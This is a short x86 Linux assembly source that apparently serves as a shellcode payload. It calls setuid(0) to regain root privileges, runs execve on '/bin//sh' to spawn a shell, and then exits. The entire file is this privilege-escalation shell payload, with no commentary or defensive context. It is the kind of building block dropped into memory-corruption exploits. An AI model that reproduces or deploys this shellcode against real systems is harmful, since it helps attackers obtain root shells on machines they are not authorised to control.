section .data
	string db '/bin//sh'
section .text
global _start
	_start:
	; setuid
	mov eax, 00d5H
	mov ebx, 0
	int 80H
	; execve
	mov eax, 000BH
	mov ebx, string
	xor ecx, ecx
	xor edx, edx
	int 80H
	; exit
	mov eax, 1
	mov ebx, 0
	int 80H


